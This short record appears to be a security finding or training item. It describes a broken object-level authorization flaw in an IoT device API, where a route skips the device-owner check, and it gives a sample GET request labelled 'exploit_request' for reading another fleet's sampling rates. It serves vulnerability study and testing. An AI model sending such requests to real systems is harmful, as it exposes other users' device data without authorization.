diagnosis: The route handler relies on unverified headers or unvalidated device lookups without checking if device.owner_id == current_user.id. Any authenticated user can read IoT device sensor configurations and operational frequencies across all fleets.
exploit_request:
GET /api/v1/devices/9e3a0984-2194-43cb-b66a-129482928340/sampling-rates HTTP/1.1
Host: api.example.com
Authorization: Bearer <authenticated_user_token>
X-Device-Client-ID: client_gateway_01
